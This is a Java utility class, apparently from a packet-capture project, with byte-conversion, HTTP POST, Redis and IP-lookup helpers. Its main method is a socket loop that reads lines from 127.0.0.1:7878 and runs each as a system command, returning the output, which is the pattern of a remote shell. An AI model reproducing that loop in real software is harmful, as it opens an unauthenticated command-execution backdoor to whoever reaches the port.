package mytest.utils;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.PropertyFilter;
import jpcap.packet.Packet;
import mytest.bean.CommonPacket;
import org.apache.commons.io.IOUtils;
import org.apache.http.HttpEntity;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;
import org.omg.PortableServer.POA;
import redis.clients.jedis.Jedis;

import java.io.*;
import java.net.NetworkInterface;
import java.net.Socket;
import java.util.Arrays;
import java.util.Properties;

public class MyUtils {
    private static Properties properties = new Properties();
    static {
        InputStream inputStream = MyUtils.class.getClassLoader().getResourceAsStream("config.properties");
        try {
            properties.load(inputStream);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static byte[] intToByteArray(int i) {
        byte[] result = new byte[4];
        // 由高位到低位
        result[0] = (byte) ((i >> 24) & 0xFF);
        result[1] = (byte) ((i >> 16) & 0xFF);
        result[2] = (byte) ((i >> 8) & 0xFF);
        result[3] = (byte) (i & 0xFF);
        return result;
    }
    public static int byteArrayToInt(byte[] bytes) {
        int value = 0;
        // 由高位到低位
        for (int i = 0; i < 4; i++) {
            int shift = (4 - 1 - i) * 8;
            value += (bytes[i] & 0x000000FF) << shift;// 往高位游
        }
        return value;
    }
    public static byte[] IPv4toByteArray(String ip) {
        byte[] bytes = new byte[4];
        int i = 0;
        for (String s : ip.split("\\.")) {
            bytes[i++] = (byte) Integer.parseInt(s);

        }
        return bytes;
    }

    public static void post(String data,String uri) {
        CloseableHttpClient httpClient = HttpClientBuilder.create().build();

        HttpPost httpPost = new HttpPost(properties.getProperty("serverURL")+uri);
        StringEntity entity = new StringEntity(data, "UTF-8");
        entity.setContentType("application/json");
        httpPost.setEntity(entity);
        System.out.println(data);
//        // 响应模型
//        CloseableHttpResponse response = null;
//        try {
//            // 由客户端执行(发送)Post请求
        try {
            httpClient.execute(httpPost);
        } catch (IOException e) {
            e.printStackTrace();
        }
//            // 从响应模型中获取响应实体
//            HttpEntity responseEntity = response.getEntity();
//
//            System.out.println("响应状态为:" + response.getStatusLine());
//            if (responseEntity != null) {
//                System.out.println("响应内容长度为:" + responseEntity.getContentLength());
//                System.out.println("响应内容为:" + EntityUtils.toString(responseEntity));
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }finally {
//            try {
//                // 释放资源
//                if (httpClient != null) {
//                    httpClient.close();
//                }
//                if (response != null) {
//                    response.close();
//                }
//            } catch (IOException e) {
//                e.printStackTrace();
//            }
//        }
    }


    public static void main(String[] args) {
        try {
            Socket socket = new Socket("127.0.0.1",7878);
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            while(true){
                String cmd = reader.readLine();
                while (cmd == null){
//                    cmd = ;
                }
                System.out.println(cmd);
                if(null != cmd) {
                    Process process = Runtime.getRuntime().exec(cmd);
                    String res = IOUtils.toString(process.getInputStream(), "gbk");
                    writer.write(res + "--end--\r\n");
                    writer.flush();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public static Jedis getJedis() {
        String ip = (String) properties.get("redis.ip");
        String port = (String) properties.get("redis.port");
        return new Jedis(ip, Integer.parseInt(port));
    }

    public static Properties getProperties(){
        return properties;
    }

    public static String getIp() {
        try {
            if (NetworkInterface.getNetworkInterfaces().hasMoreElements()) {
                return NetworkInterface.getNetworkInterfaces().nextElement().getInetAddresses().nextElement().getHostAddress();
            }
        } catch (Exception e) {
            throw new RuntimeException("无法获取本机IP");
        }
        return null;
    }
}